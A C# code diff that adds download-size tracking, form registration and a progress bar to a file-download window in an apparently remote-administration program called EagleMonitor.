@@ -17,16 +17,23 @@ namespace EagleMonitor.Forms
     {
         internal string fileToDownload { get; set; }
         internal string baseIp { get; set; }
-        public DownloadFileForm(string fileToDownload, string baseIp)
+        internal long totalSize { get; set; }
+        internal long currentDownloaded { get; set; }
+        internal ClientHandler clientHandler { get; set; }
+
+        public DownloadFileForm(string fileToDownload, string baseIp, long totalSize)
         {
+            this.currentDownloaded = 0;
+            this.Name = baseIp + ":" + Miscellaneous.SplitPath(fileToDownload);
+            this.totalSize = totalSize;
             this.fileToDownload = fileToDownload;
             this.baseIp = baseIp;
+            FileManagerForm.downloadForms.Add(this.Name, this);
             InitializeComponent();
         }
 
         private void DownloadFileForm_Shown(object sender, EventArgs e)
         {
-            ClientHandler.ClientHandlersList[this.baseIp].fileManagerForm.files.Add(Miscellaneous.SplitPath(this.fileToDownload), this);
 
             DownloadFilePacket dowloadFilePacket = new DownloadFilePacket(fileToDownload)
             {
@@ -39,6 +46,11 @@ namespace EagleMonitor.Forms
         {
             ReleaseCapture();
             SendMessage(this.FindForm().Handle, 161, 2, 0);
+        }
+
+        private void DownloadFileForm_Load(object sender, EventArgs e)
+        {
+            this.guna2ProgressBar1.Maximum = (int)totalSize;
         }
     }
 }
